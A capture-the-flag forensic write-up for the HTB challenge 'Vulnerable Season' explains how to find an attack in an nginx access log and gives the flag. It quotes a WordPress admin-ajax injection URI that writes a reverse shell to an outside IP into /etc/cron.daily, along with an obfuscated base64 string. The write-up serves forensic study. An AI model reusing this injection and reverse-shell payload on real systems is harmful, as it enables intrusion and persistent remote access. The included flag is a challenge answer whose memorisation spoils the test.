# Forensic Vulnerable Season
## Solution:

**Flag: HTB{L0g_@n4ly5t_4_bEg1nN3r}**

*That is quite little bit easy challenge, but i dunno this take me much time to read all that. But easily, you can do this job for get the flag*

1. You need to analysis that access.log file come from nginx include two type request --> 200 and 404
2. Base on the description, they talk their machine is pwned, so it much be return 200 for successful requests, You need to follow up that kind, with me is just use bash script to solve

        cat access.log | awk '{ if ($9 == 200) { print $7 } }'  > uri.log
        ## Description ##
            This stuff command will help you find the 200 request status and print the request URI into uri.log file
        ## End ##

3. After that you can decrease the line you need to read from 11734 --> 792, easily for little :smiley:. So the machine is pwned, the script can do that is some kind like reverse shell and the string in line 545 is very supicious. 

        /wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo%20%22sh%20-i%20%3E&%20/dev/tcp/82.179.92.206/7331%200%3E&1%22%20%3E%20/etc/cron.daily/testconnect%20&&%20Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo%20$Mz$Tz$Vz$az$Kz$Oz|base64%20-d|rev:NULL:NULL

        ## Description ##
            This request uri like a bash script, it will do something like send tcp connect to ip address and get the shell. But on the string have some base64 and you can take look they use base64 for decoding that and reverse that again
        ## End ##

4. So go take look about my `solve.sh`, this contain the code which end of line a request URI. Execute that bash script and you will got will that

        ./solve.sh

**Get the result and GG**
